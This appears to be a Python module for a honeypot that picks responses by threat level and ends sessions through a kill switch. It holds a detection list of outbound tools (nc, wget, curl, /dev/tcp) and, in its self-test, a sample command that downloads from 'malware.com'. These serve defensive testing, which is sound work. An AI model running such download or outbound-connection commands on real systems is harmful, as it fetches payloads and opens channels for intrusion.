"""
Adaptive response engine module.
Determines honeypot responses based on threat levels.
"""

import logging
import yaml
from typing import Dict, Any
import os

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

class ResponseEngine:
    """Adaptive response engine for mitigating threats dynamically."""
    
    def __init__(self, config_path: str = "config/config.yaml") -> None:
        """
        Initialize the response engine.

        Args:
            config_path (str): Path to the configuration YAML.
        """
        self.config_path = config_path
        self.config: Dict[str, Any] = {}
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r', encoding='utf-8') as f:
                    self.config = yaml.safe_load(f) or {}
            except IOError as e:
                logging.error(f"Failed to read config file {config_path}: {e}")
            
        self.actions = self.config.get("responses", {
            "Scanner": {"action": "monitor", "delay": 0},
            "Amateur": {"action": "tarpit", "delay": 2},
            "Advanced": {"action": "fake_flag", "delay": 0}
        })

    def get_response(self, threat_level: str, session: Dict[str, Any]) -> Dict[str, Any]:
        """
        Get the configured response for a given threat level.

        Args:
            threat_level (str): The classified threat level.
            session (Dict[str, Any]): Session data context.

        Returns:
            Dict[str, Any]: Action dictionary.
        """
        if self.should_kill_switch(session):
            return {"action": "kill_session", "delay": 0, "reason": "kill_switch_triggered"}
        
        return self.actions.get(threat_level, {"action": "monitor", "delay": 0})

    def should_kill_switch(self, session: Dict[str, Any]) -> bool:
        """
        Check if kill switch conditions are met.

        Args:
            session (Dict[str, Any]): Session data.

        Returns:
            bool: True if kill switch should be activated, False otherwise.
        """
        commands = session.get("commands", [])
        duration = session.get("duration_sec", 0.0)
        cmd_count = len(commands)
        
        # Rule 1: >100 commands in <10s
        if cmd_count > 100 and duration < 10:
            return True
            
        # Rule 2: >10 identical commands
        if cmd_count > 10:
            cmd_freq = {}
            for c in commands:
                cmd_freq[c] = cmd_freq.get(c, 0) + 1
                if cmd_freq[c] > 10:
                    return True
                    
        # Rule 3: Attempted outbound connection pattern in commands
        outbound_patterns = ["nc ", "wget ", "curl ", "/dev/tcp"]
        for c in commands:
            for pat in outbound_patterns:
                if pat in c:
                    return True
                    
        return False

    def log_response(self, session_id: str, threat_level: str, action: Dict[str, Any]) -> None:
        """
        Log the response action taken.

        Args:
            session_id (str): ID of the session.
            threat_level (str): The threat level that triggered the action.
            action (Dict[str, Any]): The action dictionary.
        """
        logging.info(f"Response Triggered | Session: {session_id} | Threat: {threat_level} | Action: {action}")

if __name__ == "__main__":
    # Create dummy config file if not exists
    os.makedirs("config", exist_ok=True)
    if not os.path.exists("config/config.yaml"):
        with open("config/config.yaml", "w", encoding="utf-8") as f:
            yaml.dump({
                "responses": {
                    "Scanner": {"action": "monitor", "delay": 0},
                    "Amateur": {"action": "tarpit", "delay": 2},
                    "Advanced": {"action": "fake_flag", "delay": 0}
                }
            }, f)
            
    engine = ResponseEngine("config/config.yaml")
    
    # Test Scanner
    sess_scanner = {"session_id": "sess_1", "commands": ["whoami"], "duration_sec": 5.0}
    action1 = engine.get_response("Scanner", sess_scanner)
    engine.log_response(sess_scanner["session_id"], "Scanner", action1)
    
    # Test Amateur
    sess_amateur = {"session_id": "sess_2", "commands": ["ls -la"], "duration_sec": 60.0}
    action2 = engine.get_response("Amateur", sess_amateur)
    engine.log_response(sess_amateur["session_id"], "Amateur", action2)
    
    # Test Advanced
    sess_advanced = {"session_id": "sess_3", "commands": ["sudo -l"], "duration_sec": 300.0}
    action3 = engine.get_response("Advanced", sess_advanced)
    engine.log_response(sess_advanced["session_id"], "Advanced", action3)
    
    # Test Kill Switch (outbound connection)
    sess_kill = {"session_id": "sess_4", "commands": ["wget http://malware.com/drop"], "duration_sec": 10.0}
    action4 = engine.get_response("Amateur", sess_kill)
    engine.log_response(sess_kill["session_id"], "Amateur", action4)
